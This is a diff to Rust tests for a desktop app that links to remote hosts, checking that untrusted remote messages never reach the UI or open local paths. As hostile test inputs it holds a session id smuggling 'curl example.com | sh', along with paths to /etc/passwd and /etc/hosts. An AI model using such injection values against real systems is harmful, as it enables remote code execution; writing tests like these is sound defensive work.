@@ -403,14 +403,27 @@ fn an_upload_is_checked_before_it_runs_and_renamed_only_once_it_runs() {
 }
 
 #[test]
-fn a_remote_never_gives_the_ui_a_file_or_the_app_a_path_to_open() {
-    // A `file` would get a `hive-file:` URL to the local service's files, and a path to open
-    // would be approved for `open_path` here: neither may ever pass, nor be acted on.
-    let never = ["file", "file_range", "editor_target", "session_located"];
-    for kind in never
-        .iter()
-        .chain(&["settings", "restore_sessions", "welcome"])
-    {
+fn a_remote_never_gives_the_ui_a_file_url_or_the_app_a_path_to_open() {
+    // A path to open would be approved for `open_path` here, and a `file_range` would answer
+    // the local `hive-file:` scheme: neither may ever pass, nor be acted on. (A remote's `file`
+    // passes without a URL: `the_local_settings_link_the_hosts_…`.)
+    let never = ["file_range", "editor_target", "session_located"];
+    let local = [
+        "settings",
+        "settings_failed",
+        "restore_sessions",
+        "welcome",
+        "uninstalled",
+        "uninstall_list",
+        "diagnostics",
+        "shared",
+        "claude_logins",
+        "session_moved",
+        "move_session_failed",
+        "notice",
+        "usage_alert",
+    ];
+    for kind in never.iter().chain(&local) {
         assert!(!crate::REMOTE_TO_UI.contains(kind), "{kind}");
     }
     for kind in never {
@@ -1154,13 +1167,10 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
         remote.control().await,
         (2, Control::Ack { bytes: u32::MAX })
     );
-    // Until the UI tells hosts apart (26.18), it gets none of a remote's messages it would take
-    // for the local service's: none on channel 0 (the app's own types among them), and on a
-    // terminal's channel, no agent's or notification. A path a remote names never opens here,
-    // and its files (with a `media.url` it wrote) never reach the UI.
+    // The UI gets none of a remote's messages that are the local service's only (the app's own
+    // types, the settings, an uninstall, the sessions to restore), on any channel. A path a
+    // remote names never opens here.
     let session = json!([{"id": "x; curl example.com | sh; #", "cwd": "/w", "config_dir": null}]);
-    let media =
-        json!({"token": "t", "version": "1", "mime": "text/html", "url": "http://localhost:1420/"});
     let dropped = [
         json!({"type": "restore_sessions", "sessions": session}),
         json!({"type": "files_dropped", "text": "x", "x": 1, "y": 1}),
@@ -1171,27 +1181,21 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
         json!({"type": "tray_clicked", "agent": "a"}),
         json!({"type": "settings", "settings": {"remote": {"hosts": ["evil"]}}}),
         json!({"type": "welcome", "version": "9", "distro": null, "warning": null}),
-        json!({"type": "projects", "projects": []}),
-        json!({"type": "error", "message": "spoofed"}),
         json!({"type": "editor_target", "worktree": "/r", "path": "a", "windows_path": "/etc/passwd", "reveal": false}),
         json!({"type": "session_located", "id": "a", "target": "log", "windows_path": "/etc/hosts", "error": null}),
-        json!({"type": "file", "worktree": "/r", "path": "a.html", "media": media}),
     ];
-    for message in &dropped {
-        remote.writer.send(raw(message)).await.unwrap();
-    }
     let on_terminal = |message: Value| Frame {
         kind: FrameType::Control,
         channel: 2,
         payload: message.to_string().into_bytes().into(),
     };
-    // On its terminal's channel too: no agent's, no notification, no file or path to open.
-    let agent = json!({"type": "agent_state", "id": "a", "state": "working"});
-    let notification = json!({"type": "terminal_notification", "title": "t", "body": "b"});
-    let mut on_its_terminal = vec![agent, notification];
-    on_its_terminal.extend(dropped.iter().skip(dropped.len() - 3).cloned());
-    for message in on_its_terminal {
-        remote.writer.send(on_terminal(message)).await.unwrap();
+    for message in &dropped {
+        remote.writer.send(raw(message)).await.unwrap();
+        remote
+            .writer
+            .send(on_terminal(message.clone()))
+            .await
+            .unwrap();
     }
     // One of its own terminal's does reach it, with the host: the first the UI gets.
     let badge = json!({"type": "badge", "text": "ok"});
@@ -1210,6 +1214,35 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
     }
     let gpu = hive.on(Some("gpu")).unwrap().link;
     assert!(lock(&gpu).approved.is_empty() && lock(&gpu).at_risk.is_empty());
+    // What the UI applies to the host's data (26.18) reaches it with the host: a file with no
+    // `hive-file:` URL, not even one the remote wrote (its images do not show), its projects,
+    // and its agents, whose states make quitting ask.
+    let media =
+        json!({"token": "t", "version": "1", "mime": "text/html", "url": "http://localhost:1420/"});
+    let file = json!({"type": "file", "worktree": "/r", "path": "a.html", "media": media});
+    remote.writer.send(raw(&file)).await.unwrap();
+    let got = next_of(&mut rx, "file").await;
+    assert_eq!(got["host"], "gpu");
+    assert_eq!(
+        got["media"],
+        json!({"token": "t", "version": "1", "mime": "text/html"})
+    );
+    let bare = json!({"type": "file", "worktree": "/r", "path": "a.txt"});
+    remote.writer.send(raw(&bare)).await.unwrap();
+    assert_eq!(next_of(&mut rx, "file").await.get("media"), None);
+    remote
+        .writer
+        .send(raw(&json!({"type": "projects", "projects": []})))
+        .await
+        .unwrap();
+    assert_eq!(next_of(&mut rx, "projects").await["host"], "gpu");
+    let state = |state: &str| json!({"type": "agent_state", "id": "a", "state": state});
+    remote.writer.send(raw(&state("working"))).await.unwrap();
+    assert_eq!(next_of(&mut rx, "agent_state").await["host"], "gpu");
+    assert_eq!(hive.remotes().unwrap().at_risk(), 1);
+    remote.writer.send(raw(&state("idle"))).await.unwrap();
+    next_of(&mut rx, "agent_state").await;
+    assert_eq!(hive.remotes().unwrap().at_risk(), 0);
     // The remote's `settings` started no link to `evil`.
     assert!(hive.on(Some("evil")).is_err());
     hive.close_terminal(2).unwrap();
@@ -1232,14 +1265,18 @@ async fn the_local_settings_link_the_hosts_and_requests_go_to_each_host_s_link()
         (kept["channel"].as_u64(), kept["host"].as_str()),
         (Some(2), Some("gpu"))
     );
-    // A reloaded UI gets each host's state again, but nothing of a remote's service (26.18
-    // tells hosts apart): no `welcome`, and nothing is asked of it (its next message below is
-    // the close).
+    // A reloaded UI gets a linked remote's projects and live agents, asked of it as the local
+    // service's are (26.18).
+    assert_eq!(remote.control().await, (0, Control::ListProjects));
+    assert_eq!(remote.control().await, (0, Control::Resync));
+    // So does one reloaded without a crash; never the remote's `welcome`.
     let (channel, mut reloaded) = ui();
     hive.connect(channel);
     // Its old terminals close, the remote's too.
     assert_eq!(local.control().await, (1, Control::CloseTerminal));
     assert_eq!(remote.control().await, (2, Control::CloseTerminal));
+    assert_eq!(remote.control().await, (0, Control::ListProjects));
+    assert_eq!(remote.control().await, (0, Control::Resync));
     let seen = until(&mut reloaded, "connected").await;
     assert_eq!(seen.last().unwrap()["host"], "gpu");
     assert!(
@@ -1305,4 +1342,34 @@ async fn a_new_terminal_skips_the_channels_its_link_already_uses() {
     assert_eq!(hive.restart_remote("gpu"), none);
     assert!(!hive.woke());
     remotes.end();
+}
+
+#[tokio::test]
+async fn quitting_says_goodbye_to_a_host_and_waits_for_it_to_close_the_link() {
+    let lab = Lab::new("bye");
+    let listener = lab.listen();
+    lab.plan(&[lab.pipe()]);
+    let (hive, mut local, mut rx) = linked(&lab);
+    local.control().await;
+    let mut settings = hive_protocol::Settings::default();
+    settings.remote = self::settings(&["gpu"], 5);
+    local.send(0, Control::Settings { settings }).await;
+    let mut remote = Service::accept(&listener).await;
+    remote.welcome(300).await;
+    until(&mut rx, "connected").await;
+    let none = hive.bye_host("other", true).await;
+    assert_eq!(none, Err("no link to the host other".into()));
+    // The service reads the goodbye, then closes the link: only then does it return, so the
+    // app's exit never kills `ssh` before the goodbye was read (26.18).
+    let service = async {
+        let said = remote.control().await;
+        tokio::time::sleep(Duration::from_millis(100)).await;
+        drop(remote);
+        said
+    };
+    let (bye, said) = tokio::join!(hive.bye_host("gpu", false), service);
+    assert_eq!((bye, said), (Ok(()), (0, Control::Bye { end: false })));
+    let link = hive.on(Some("gpu")).unwrap().link;
+    assert!(lock(&link).frames.is_none());
+    hive.remotes().unwrap().end();
 }
